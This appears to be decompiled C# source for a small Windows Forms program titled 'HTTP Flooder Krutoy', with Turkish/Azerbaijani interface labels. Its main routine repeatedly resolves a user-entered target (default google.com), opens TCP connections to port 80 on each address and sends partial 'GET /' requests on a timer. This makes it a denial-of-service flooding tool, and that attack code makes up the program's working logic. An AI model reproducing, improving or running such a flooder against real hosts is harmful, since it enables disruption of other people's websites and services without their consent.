using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Timers;
using System.Windows.Forms;
using HTTPflooder.My;
using Microsoft.VisualBasic.CompilerServices;

namespace HTTPflooder;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("btnStart")]
	private Button _btnStart;

	[AccessedThroughProperty("TextURL")]
	private TextBox _TextURL;

	[AccessedThroughProperty("Textth")]
	private TextBox _Textth;

	[AccessedThroughProperty("btnStop")]
	private Button _btnStop;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("StatusStrip1")]
	private StatusStrip _StatusStrip1;

	[AccessedThroughProperty("ToolStripStatusLabel1")]
	private ToolStripStatusLabel _ToolStripStatusLabel1;

	[AccessedThroughProperty("TextOut")]
	private TextBox _TextOut;

	public static Timer Timer = new Timer();

	internal virtual Button btnStart
	{
		[DebuggerNonUserCode]
		get
		{
			return _btnStart;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button1_Click;
			if (_btnStart != null)
			{
				((Control)_btnStart).remove_Click(eventHandler);
			}
			_btnStart = value;
			if (_btnStart != null)
			{
				((Control)_btnStart).add_Click(eventHandler);
			}
		}
	}

	internal virtual TextBox TextURL
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextURL;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextURL = value;
		}
	}

	internal virtual TextBox Textth
	{
		[DebuggerNonUserCode]
		get
		{
			return _Textth;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Textth = value;
		}
	}

	internal virtual Button btnStop
	{
		[DebuggerNonUserCode]
		get
		{
			return _btnStop;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = btnStop_Click;
			if (_btnStop != null)
			{
				((Control)_btnStop).remove_Click(eventHandler);
			}
			_btnStop = value;
			if (_btnStop != null)
			{
				((Control)_btnStop).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual StatusStrip StatusStrip1
	{
		[DebuggerNonUserCode]
		get
		{
			return _StatusStrip1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_StatusStrip1 = value;
		}
	}

	internal virtual ToolStripStatusLabel ToolStripStatusLabel1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripStatusLabel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripStatusLabel1 = value;
		}
	}

	internal virtual TextBox TextOut
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextOut;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextOut = value;
		}
	}

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		lock (__ENCList)
		{
			__ENCList.Add(new WeakReference(this));
		}
		InitializeComponent();
	}

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)MyProject.Forms.Form1);
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_01cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d7: Expected O, but got Unknown
		//IL_044f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0459: Expected O, but got Unknown
		//IL_050c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0516: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		btnStart = new Button();
		TextURL = new TextBox();
		Textth = new TextBox();
		btnStop = new Button();
		Label1 = new Label();
		Label2 = new Label();
		StatusStrip1 = new StatusStrip();
		ToolStripStatusLabel1 = new ToolStripStatusLabel();
		TextOut = new TextBox();
		((Control)StatusStrip1).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)btnStart).set_BackgroundImage((Image)componentResourceManager.GetObject("btnStart.BackgroundImage"));
		Button obj = btnStart;
		Point location = new Point(12, 100);
		((Control)obj).set_Location(location);
		((Control)btnStart).set_Name("btnStart");
		Button obj2 = btnStart;
		Size size = new Size(83, 32);
		((Control)obj2).set_Size(size);
		((Control)btnStart).set_TabIndex(0);
		((ButtonBase)btnStart).set_Text("Başla");
		((ButtonBase)btnStart).set_UseVisualStyleBackColor(true);
		TextBox textURL = TextURL;
		location = new Point(73, 21);
		((Control)textURL).set_Location(location);
		((Control)TextURL).set_Name("TextURL");
		TextBox textURL2 = TextURL;
		size = new Size(187, 20);
		((Control)textURL2).set_Size(size);
		((Control)TextURL).set_TabIndex(1);
		TextURL.set_Text("google.com");
		TextBox textth = Textth;
		location = new Point(73, 58);
		((Control)textth).set_Location(location);
		((Control)Textth).set_Name("Textth");
		TextBox textth2 = Textth;
		size = new Size(86, 20);
		((Control)textth2).set_Size(size);
		((Control)Textth).set_TabIndex(2);
		Textth.set_Text("10");
		((Control)btnStop).set_BackgroundImage((Image)componentResourceManager.GetObject("btnStop.BackgroundImage"));
		Button obj3 = btnStop;
		location = new Point(175, 101);
		((Control)obj3).set_Location(location);
		((Control)btnStop).set_Name("btnStop");
		Button obj4 = btnStop;
		size = new Size(83, 31);
		((Control)obj4).set_Size(size);
		((Control)btnStop).set_TabIndex(3);
		((ButtonBase)btnStop).set_Text("Durdur");
		((ButtonBase)btnStop).set_UseVisualStyleBackColor(true);
		Label1.set_AutoSize(true);
		Label label = Label1;
		location = new Point(5, 21);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(42, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(4);
		Label1.set_Text("Hedef :");
		Label2.set_AutoSize(true);
		Label label3 = Label2;
		location = new Point(5, 58);
		((Control)label3).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label4 = Label2;
		size = new Size(34, 13);
		((Control)label4).set_Size(size);
		((Control)Label2).set_TabIndex(5);
		Label2.set_Text("Vaxt :");
		((ToolStrip)StatusStrip1).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)ToolStripStatusLabel1 });
		StatusStrip statusStrip = StatusStrip1;
		location = new Point(0, 297);
		((Control)statusStrip).set_Location(location);
		((Control)StatusStrip1).set_Name("StatusStrip1");
		StatusStrip statusStrip2 = StatusStrip1;
		size = new Size(270, 22);
		((Control)statusStrip2).set_Size(size);
		((Control)StatusStrip1).set_TabIndex(6);
		((Control)StatusStrip1).set_Text("StatusStrip1");
		((ToolStripItem)ToolStripStatusLabel1).set_Name("ToolStripStatusLabel1");
		ToolStripStatusLabel toolStripStatusLabel = ToolStripStatusLabel1;
		size = new Size(66, 17);
		((ToolStripItem)toolStripStatusLabel).set_Size(size);
		((ToolStripItem)ToolStripStatusLabel1).set_Text("Status : Idle");
		TextBox textOut = TextOut;
		location = new Point(8, 153);
		((Control)textOut).set_Location(location);
		TextOut.set_Multiline(true);
		((Control)TextOut).set_Name("TextOut");
		TextBox textOut2 = TextOut;
		size = new Size(252, 123);
		((Control)textOut2).set_Size(size);
		((Control)TextOut).set_TabIndex(7);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_AutoSizeMode((AutoSizeMode)0);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		size = new Size(270, 319);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)TextOut);
		((Control)this).get_Controls().Add((Control)(object)StatusStrip1);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)btnStop);
		((Control)this).get_Controls().Add((Control)(object)Textth);
		((Control)this).get_Controls().Add((Control)(object)TextURL);
		((Control)this).get_Controls().Add((Control)(object)btnStart);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("HTTP Flooder Krutoy");
		((Control)StatusStrip1).ResumeLayout(false);
		((Control)StatusStrip1).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		Timer.Elapsed += HttpFlood;
		Timer.Interval = Convert.ToInt32(Textth.get_Text());
		Timer.Start();
	}

	private void btnStop_Click(object sender, EventArgs e)
	{
		Timer.Stop();
		((ToolStripItem)ToolStripStatusLabel1).set_Text("Status : " + Conversions.ToString(DateTime.Now) + " Dayandirildi");
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		Control.set_CheckForIllegalCrossThreadCalls(false);
		((ToolStripItem)ToolStripStatusLabel1).set_Text("Status : " + Conversions.ToString(DateTime.Now) + " Baslamayib");
	}

	public void HttpFlood(object sender, ElapsedEventArgs e)
	{
		((ToolStripItem)ToolStripStatusLabel1).set_Text("Status : " + Conversions.ToString(DateTime.Now) + " : Basladi ");
		IPHostEntry hostEntry = Dns.GetHostEntry(TextURL.get_Text());
		IPAddress[] addressList = hostEntry.AddressList;
		checked
		{
			int num = addressList.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					IPAddress address = IPAddress.Parse(addressList[num2].ToString());
					IPEndPoint iPEndPoint = new IPEndPoint(address, 80);
					Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
					((TextBoxBase)TextOut).AppendText(Conversions.ToString(DateTime.Now) + " Basladi " + iPEndPoint.ToString() + "\n");
					try
					{
						socket.Connect(iPEndPoint);
					}
					catch (SocketException projectError)
					{
						ProjectData.SetProjectError((Exception)projectError);
						((TextBoxBase)TextOut).AppendText("Diyandirildi !\n");
						socket.Close();
						ProjectData.ClearProjectError();
						break;
					}
					try
					{
						socket.Send(Encoding.ASCII.GetBytes("GET /"));
					}
					catch (SocketException projectError2)
					{
						ProjectData.SetProjectError((Exception)projectError2);
						((TextBoxBase)TextOut).AppendText("Diyandirildi !\n");
						socket.Close();
						ProjectData.ClearProjectError();
						break;
					}
					socket.Close();
					num2++;
					continue;
				}
				break;
			}
		}
	}
}
